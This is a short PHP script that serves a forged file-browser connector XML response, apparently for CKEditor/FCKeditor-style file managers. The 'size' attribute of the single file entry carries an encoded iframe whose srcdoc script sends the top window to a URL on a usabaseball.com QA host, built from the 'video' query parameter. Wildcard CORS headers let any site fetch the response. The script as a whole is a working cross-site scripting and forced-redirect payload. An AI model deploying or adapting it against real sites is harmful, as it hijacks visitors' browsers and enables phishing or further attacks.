<?php
    $dynamicValue = isset($_GET['video']) ? $_GET['video'] : '';
    
    $xmlTemplate = '<?xml version="1.0" encoding="UTF-8"?>
<Connector command="GetFoldersAndFiles" resourceType="Document">
    <CurrentFolder path="/1 - f/" url=""/>
    <Files>
        <File desc="1" name="Loading..." size="&lt;iframe height=&quot;0&quot; width=&quot;0&quot; srcdoc=&quot;&amp;lt;script&amp;gt;window.top.location.href=\'https://qa-aws.usabaseball.com/nhk/video/%s\';&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;" url="1"/>
    </Files>
</Connector>';

$xmlData = sprintf($xmlTemplate, htmlspecialchars($dynamicValue));

header('Content-Type: text/xml;charset=UTF-8');

// Allow CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST');
header('Access-Control-Allow-Headers: X-Requested-With');

echo $xmlData;
?>